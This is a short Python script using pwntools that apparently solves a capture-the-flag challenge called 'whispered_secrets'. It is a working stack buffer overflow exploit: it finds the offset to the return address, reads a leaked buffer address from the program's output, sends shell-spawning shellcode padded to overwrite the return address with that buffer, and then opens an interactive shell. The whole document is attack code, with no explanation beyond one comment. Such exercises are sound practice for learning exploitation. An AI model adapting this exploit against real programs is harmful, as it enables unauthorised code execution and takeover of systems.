#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./whispered_secrets', checksec=False)
context.arch = 'amd64'
context.os = 'linux'

OFFSET_TO_RIP = cyclic_find(0x6261616b6261616a) #found with pwndbg, we can use also Coredump
print(OFFSET_TO_RIP)

p = process(elf.path)

leak_line = p.recvline_contains(b"secret:")
buf_addr = int(leak_line.split(b"secret: ")[1].strip(), 16)
log.info(f"buf = {buf_addr:#x}")

shellcode = asm(shellcraft.sh())

payload = flat(
    shellcode,
    b"A" * (OFFSET_TO_RIP - len(shellcode)),
    p64(buf_addr),
)
p.sendafter(b"secret:\n", payload)
p.interactive()